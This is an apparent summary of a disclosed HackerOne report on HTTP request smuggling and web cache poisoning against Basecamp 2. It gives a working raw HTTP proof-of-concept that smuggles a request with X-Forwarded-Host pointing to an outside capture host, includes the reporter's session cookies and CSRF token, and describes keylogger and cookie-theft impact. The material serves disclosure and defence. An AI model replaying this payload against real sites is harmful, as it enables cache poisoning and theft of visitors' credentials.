# HTTP Request Smuggling on Basecamp 2 Enables Web Cache Poisoning

## Metadata
- **Source:** HackerOne
- **Report:** 919175 | https://hackerone.com/reports/919175
- **Submitted:** 2020-07-08
- **Reporter:** hazimaslam
- **Program:** Basecamp
- **Bounty:** Not specified in report
- **Severity:** critical
- **Vuln:** HTTP Request Smuggling, Web Cache Poisoning, CL.TE (Content-Length/Transfer-Encoding) Desynchronization
- **CVEs:** None
- **Category:** uncategorised

## Summary
An authenticated attacker can exploit HTTP request smuggling via mishandled Content-Length and Transfer-Encoding headers to desynchronize front-end and backend servers on Basecamp 2. By injecting a malicious request with a spoofed X-Forwarded-Host header, the attacker can poison the web cache to serve harmful redirects to all subsequent visitors, enabling persistent mass exploitation.

## Attack scenario
1. Attacker authenticates to Basecamp 2 and crafts a POST request with conflicting Content-Length (144) and Transfer-Encoding (chunked) headers
2. The smuggled request uses chunked encoding to bypass Content-Length parsing on the frontend, while the backend interprets it differently
3. Attacker injects a second GET request within the same connection using X-Forwarded-Host header pointing to attacker-controlled domain
4. Frontend caching layer caches the malicious response associated with the legitimate URL
5. Subsequent legitimate users requesting the poisoned URL receive the cached malicious response (e.g., javascript redirect to keylogger)
6. Attacker harvests credentials, cookies, and sensitive request headers from victims at scale

## Root cause
The Basecamp 2 infrastructure fails to properly handle conflicting HTTP/1.1 request smuggling vectors (Content-Length vs Transfer-Encoding headers). The frontend cache does not validate or normalize the Host header, allowing X-Forwarded-Host spoofing to associate arbitrary external URLs with legitimate internal URLs.

## Attacker mindset
An authenticated attacker with moderate technical skill can execute this attack. The attacker recognizes the cache poisoning potential of request smuggling and strategically targets authentication-critical resources (login page, javascript imports) to compromise multiple users. The persistence of cache poisoning makes this high-value for credential theft at scale.

## Defensive takeaways
- Strictly enforce RFC 7230: reject requests with both Content-Length and Transfer-Encoding headers or normalize to single representation
- Implement request smuggling detection by ensuring frontend and backend parse HTTP identically; disable HTTP/1.1 request smuggling-prone features where possible
- Never trust X-Forwarded-Host or similar proxy headers for cache key generation; use only the authoritative Host header or validate against whitelist
- Segregate cache keys to prevent cross-origin poisoning; include scheme and validated host in cache key
- Disable connection reuse after detecting ambiguous request boundaries
- Implement cache poisoning detection: alert on unusual redirect responses in cached content
- Require re-authentication for sensitive operations (account modifications) beyond CSRF token

## Variant hunting
Search for other applications using similar frontend-backend proxy architectures with CDN/cache layers. Test for CL.TE, TE.CL, and TE.TE smuggling vectors. Examine applications that accept X-Forwarded-Host or similar headers for redirect generation. Look for cache behavior with conflicting Content-Length/Transfer-Encoding in authenticated endpoints.

## MITRE ATT&CK
- T1190: Exploit Public-Facing Application
- T1557: Adversary-in-the-Middle
- T1071: Application Layer Protocol

## Notes
This is a classic HTTP request smuggling report exploiting desynchronization between frontend and backend HTTP parsing. The cache poisoning aspect elevates impact from single-victim to multi-victim persistence. The reliance on authentication is a minor mitigation but does not prevent abuse by authorized users. The report includes proof-of-concept that directly demonstrates the vulnerability with captured requests.

## Full report
<details><summary>Expand</summary>

It is found that an authenticated Basecamp 2 user can desync front and backend servers and poison the socket with harmful response for the next visitor.  During redirect probe, It also appears that front-end infrastructure performs caching of content. Using HTTP request smuggling attack, It is possible to poison the cache with the off-site redirect response using `X-Forwarded-Host` request header in smuggled request. This will make the attack persistent, affecting any user who subsequently requests the affected URL.

## Validation steps
**1.**  Open https://requestbin.com/r/enjv2g5042bg in your browser for request capturing.

**2.** Paste the following request in Burp repeater (I've embedded my session in the request for your ease):

```http
POST /4618984/account HTTP/1.1
Host: basecamp.com
Connection: keep-alive
Content-Length: 144
Accept: */*
X-CSRF-Token: BW5Kp3r1hLOuZI6+4GkBW5XUpkt55bi9tIiqgKFo1ZY=
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: _basecamp_session=BAh7CEkiD3Nlc3Npb25faWQGOgZFVEkiJTAwNzU0OTI3NWZjMTI0Zjk5ZTVlOGE5NTU0MGFhN2UyBjsAVEkiEF9jc3JmX3Rva2VuBjsARkkiMUJXNUtwM3IxaExPdVpJNis0R2tCVzVYVXBrdDU1Ymk5dElpcWdLRm8xWlk9BjsARkkiDnBlcnNvbl9pZAY7AEZpBHYSEQE%3D--ced0e607b9844aff72e0b9421e73e4d52c8b04bc;identity_id=BAhpBOwxQgE%3D--3a11dbd3096b61294dc6c864b807a87944e4b6ab;
Transfer-Encoding: chunked
Transfer-encoding: identity

22
_method=patch&account%5Bname%5D=BC
0

GET /x HTTP/1.1
X-Forwarded-Host: enjv2g5042bg.x.pipedream.net
X-Forwarded-Proto: http
Foo: bar
```
Make sure to set the target to `https://basecamp.com` and port to `443`.

**3.** Issue the request in repeater.

**4.** Observe the captured request in RequestBin.com

## Impact

- With request smuggling, attacker can serve harmful response to random people actively browsing the website, enabling straightforward mass-exploitation.

- By redirecting javascript imports to a malicious domain, an attacker can inject a key-logger and steal user passwords from login page.

- It is also possible to capture visitors' request headers and cookies.

</details>

---
*Analysed by Claude on 2026-05-24*
